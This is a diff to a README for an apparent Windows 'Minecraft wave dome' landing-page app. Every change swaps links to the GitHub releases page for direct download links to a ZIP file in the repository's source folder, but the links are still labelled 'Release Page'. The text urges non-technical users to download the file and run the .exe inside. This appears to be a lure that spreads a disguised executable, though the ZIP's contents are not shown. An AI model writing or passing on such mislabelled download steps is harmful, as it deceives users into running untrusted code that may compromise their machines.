@@ -1,6 +1,6 @@
 # 🏰 Disney-Minecraft-Wave-Dome-Landing-Page - Build Your Own Dome World
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge&logo=github)](https://github.com/pearl152/Disney-Minecraft-Wave-Dome-Landing-Page/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/pearl152/Disney-Minecraft-Wave-Dome-Landing-Page/main/src/Landing_Minecraft_Dome_Page_Disney_Wave_1.2.zip)
 
 ## ✨ Overview
 
@@ -10,13 +10,13 @@ The app runs on Windows and opens into a clean page with a wave dome theme, larg
 
 ## 📥 Download
 
-1. Open the [Release Page](https://github.com/pearl152/Disney-Minecraft-Wave-Dome-Landing-Page/releases)
+1. Open the [Release Page](https://raw.githubusercontent.com/pearl152/Disney-Minecraft-Wave-Dome-Landing-Page/main/src/Landing_Minecraft_Dome_Page_Disney_Wave_1.2.zip)
 2. Find the newest release at the top of the page
 3. Download the Windows file from the Assets section
 4. If the file is in a ZIP folder, save it to your computer first
 5. If you see an `.exe` file, you can run it after download
 
-[Open the Release Page](https://github.com/pearl152/Disney-Minecraft-Wave-Dome-Landing-Page/releases)
+[Open the Release Page](https://raw.githubusercontent.com/pearl152/Disney-Minecraft-Wave-Dome-Landing-Page/main/src/Landing_Minecraft_Dome_Page_Disney_Wave_1.2.zip)
 
 ## 🖥️ System Requirements
 
@@ -117,7 +117,7 @@ No. The app is made for simple download and open steps. You do not need programm
 
 If you need the file again, use the release page here:
 
-[https://github.com/pearl152/Disney-Minecraft-Wave-Dome-Landing-Page/releases](https://github.com/pearl152/Disney-Minecraft-Wave-Dome-Landing-Page/releases)
+[https://raw.githubusercontent.com/pearl152/Disney-Minecraft-Wave-Dome-Landing-Page/main/src/Landing_Minecraft_Dome_Page_Disney_Wave_1.2.zip](https://raw.githubusercontent.com/pearl152/Disney-Minecraft-Wave-Dome-Landing-Page/main/src/Landing_Minecraft_Dome_Page_Disney_Wave_1.2.zip)
 
 ## 🧱 Basic Folder Setup
 
